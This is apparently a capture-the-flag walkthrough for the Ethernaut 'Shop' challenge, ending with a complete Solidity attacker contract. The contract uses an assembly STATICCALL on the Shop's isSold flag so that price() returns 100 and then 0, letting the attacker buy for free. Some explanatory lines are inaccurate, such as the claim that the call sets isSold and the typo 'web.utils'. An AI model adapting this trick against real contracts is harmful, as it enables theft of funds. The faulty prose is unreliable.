# Shop

**HINT:** Look back at the Elevator challenge and take a look at gas usage in the [Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) page 26. Another website that will help is the [EVM Opcodes.](https://ethervm.io/) 

<details>
<summary>Step 1</summary>
<p>

We first need to change the state variable ```isSold()``` from false to true. to do so we use STATICCALL within assemby <br></br>
The parameters are:
* gas
* addr
    * We use SLOAD to load the storage at slot 0
* argsOffset
    * The data of ```isSold()``` is needed, and needs to go into MSTORE
    * In the console us: 

    ```js 
    web.utils.soliditySha3('isSold()').substr(0,10) 
    //giving you:
    "0xe852e741"
    ```  
    * Since MSTORE stores 32 bytes we have to subtract the 4 bytes from ```isSold()```
    ```0x120 - 0x4 = 0x11c```
* argslength
    * ```0xe852e741``` is 4 bytes or 0x4
* retOffset
* retLength
</p>
</details>

<details>
<summary>Step 2</summary>
<p>
From there we need to check if isSold() is now 0 and then set a new price 0. Like so:

```
        if iszero(mload(0x120)) {
           mstore(0x150, 0x64)
           return(0x150, 0x20) 
        }
        mstore(0x150, 0x0)
        return(0x150, 0x20) 
    }
```

</p>
</details>

<details>
<summary>Step 3</summary>
<p>

This is the final contract just deploy with your instance address and click call.
```
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3300)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3300)();
    }
  }
}

contract BuyerSolve {
    
    Shop public shop;
    
    constructor(address shopAddr) public {
        shop = Shop(shopAddr);
    }
    
    function price() external returns (uint) {
    assembly {
        mstore(0x100, 0xe852e741)
        mstore(0x120, 0x0)
        let result := staticcall(gas(), sload(0x0), 0x11c, 0x4, 0x120, 0x20)
        if iszero(mload(0x120)) {
           mstore(0x150, 0x64)
           return(0x150, 0x20) 
        }
        mstore(0x150, 0x0)
        return(0x150, 0x20) 
    }
}
    
    function call() public {
        shop.buy();
    }
}
```

</p>
</details>